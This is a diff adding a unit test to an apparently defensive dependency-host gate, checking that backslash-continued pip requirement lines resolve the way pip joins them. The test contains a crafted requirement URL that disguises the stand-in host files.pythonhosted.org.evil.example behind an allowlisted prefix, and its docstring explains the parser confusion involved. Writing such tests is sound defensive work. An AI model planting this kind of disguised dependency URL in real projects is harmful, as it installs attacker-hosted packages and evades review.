@@ -537,6 +537,23 @@ def test_editing_only_a_pip_continuation_body_is_a_hit():
     assert hits[0].detail.count("pypi.org.evil.example") == 1
 
 
+def test_a_continuation_line_with_leading_backslashes_resolves_as_pip_does():
+    """pip's join_lines appends `line.strip("\\\\")` for every line of a run but
+    the last, so it drops LEADING backslashes too. Stripping only the trailing
+    ones leaves a `\\` that _bad_urls turns into a path separator, which ends
+    the host at the allowlisted prefix -- the gate reads
+    files.pythonhosted.org where pip reads files.pythonhosted.org.evil.example.
+    Nothing here is a known bypass: the escape detector fires on `\\.`. But it
+    names no host, so the gate's answer would depend on which detector
+    happened to catch it rather than on resolving the line."""
+    head = ("mypkg @ https://files.pythonhosted.org\\\n"
+            "\\.evil.example/x.whl\\\n"
+            "zzz\n")
+    hits = _edited_continuation([(2, "\\.evil.example/x.whl\\")], head)
+    assert [(h.rule, h.overridable) for h in hits] == [("lockfile-host", False)]
+    assert "files.pythonhosted.org.evil.example" in hits[0].detail
+
+
 def test_a_resolved_continuation_onto_an_allowlisted_host_is_no_hit():
     """The other direction: resolving the logical line must not manufacture a
     finding when the joined URL is fine. Without the join this line looked
